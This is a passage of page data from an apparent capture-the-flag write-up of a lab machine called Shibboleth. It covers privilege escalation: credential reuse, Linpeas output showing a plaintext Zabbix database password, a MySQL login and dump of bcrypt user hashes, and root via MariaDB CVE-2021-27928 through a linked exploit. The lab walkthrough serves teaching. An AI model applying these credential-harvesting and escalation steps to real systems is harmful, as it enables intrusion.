mdx(\"h4\", null, \"USER OWN\"), mdx(\"p\", null, \"We found user \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ipmi-svc\"), \" and it had the same credentials we got from hashcat for logging into the zabbix Systems.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"su ipmi-svc\\n\")), mdx(\"p\", null, \"and we got the user flag.\"), mdx(\"h4\", null, \"System Own\"), mdx(\"p\", null, \"Ran \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Linpeas\"), \" to enumerate about the system and found port \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"3306\"), \" running.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u2554\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2563 Active Ports\\n\\u255A https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports\\ntcp        0      0 0.0.0.0:10050           0.0.0.0:*               LISTEN      -                   \\ntcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN      -                   \\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \\ntcp6       0      0 :::10050                :::*                    LISTEN      -                   \\ntcp6       0      0 :::10051                :::*                    LISTEN      -                   \\ntcp6       0      0 :::80                   :::*                    LISTEN      -        \\n\")), mdx(\"p\", null, \"We also find MYSQL (MariaDB) credentials.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\n\\u2554\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2563 Analyzing Zabbix Files (limit 70)\\n-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf\\nLogFile=/var/log/zabbix/zabbix_server.log\\nLogFileSize=0\\nPidFile=/run/zabbix/zabbix_server.pid\\nSocketDir=/run/zabbix\\nDBName=zabbix\\nDBUser=zabbix\\nDBPassword=bloooarskybluh\\nSNMPTrapperFile=/var/log/snmptrap/snmptrap.log\\nTimeout=4\\nAlertScriptsPath=/usr/lib/zabbix/alertscripts\\nExternalScripts=/usr/lib/zabbix/externalscripts\\nFpingLocation=/usr/bin/fping\\nFping6Location=/usr/bin/fping6\\nLogSlowQueries=3000\\nStatsAllowedIP=127.0.0.1\\n\")), mdx(\"p\", null, \"Logged in the Mysql Database\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"mysql -u zabbix -pbloooarskybluh -h 127.0.0.1 zabbix\\n\")), mdx(\"p\", null, \"and found so many table(\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"users\"), \" table is the one I found interesting).\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"select * from users;\\n+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+-------------+---------------+---------------+\\n| userid | alias         | name         | surname       | passwd                                                       | url | autologin | autologout | lang  | refresh | type | theme      | attempt_failed | attempt_ip  | attempt_clock | rows_per_page |\\n+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+-------------+---------------+---------------+\\n|      1 | Admin         | Zabbix       | Administrator | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 |     |         0 | 0          | en_GB | 60s     |    3 | dark-theme |              5 | 10.10.17.97 |    1648879891 |            50 |\\n|      2 | guest         |              |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | en_GB | 30s     |    1 | default    |              0 |             |             0 |            50 |\\n|      3 | Administrator | IPMI Service | Account       | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |     |         0 | 0          | en_GB | 60s     |    2 | default    |              5 | 10.10.17.97 |    1648879896 |            50 |\\n+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+-------------+---------------+---------------+\\n\")), mdx(\"p\", null, \"Tried to decrypt the hashed password but in vain. Got no successful results.\"), mdx(\"h4\", null, \"MariaDB CVE-2021-27928 vulnerabiltity\"), mdx(\"p\", null, \"A remote code execution issue was discovered in MariaDB . An untrusted search path leads to eval injection, in which a\\ndatabase SUPER user can execute OS commands after modifying wsrep_provider and wsrep_notify_cmd.\"), mdx(\"p\", null, \"Used the exploit here(\", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/Al1ex/CVE-2021-27928\"\n  }, \"https://github.com/Al1ex/CVE-2021-27928\"), \").\"), mdx(\"p\", null, \"and yay got the root access.\"));\n}\n;\nMDXContent.isMDXComponent = true;","excerpt":"Scanning and Enumeration of Open Ports (Using Nmap) Nmap Nmap (or network mapper) is a open source tool for Network exploitation and…","timeToRead":3,"banner":null}},"pageContext":{"slug":"/shibboleth","formatString":"DD.MM.YYYY"}},
    "staticQueryHashes": ["2744905544","3090400250","318001574"]}